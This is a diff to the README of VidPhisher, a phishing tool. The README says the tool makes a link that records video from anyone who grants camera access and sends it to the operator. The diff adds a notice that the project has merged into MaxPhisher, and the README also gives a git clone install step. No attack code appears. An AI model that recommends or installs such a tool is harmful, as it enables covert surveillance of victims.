@@ -21,6 +21,11 @@
 
 **VidPhisher is a phishing tool. It will generate a link. If anyone opens the link and permits camera access, his/her video will be captured and sent to you!**
 
+### [*]Announcent
+
+This project is now a part of [MaxPhisher](https://github.com/KasRoudra/MaxPhisher). Further bug fixes and feature addition will be available in that
+
+
 ### [+] Installation
 
 - `git clone https://github.com/KasRoudra/VidPhisher`
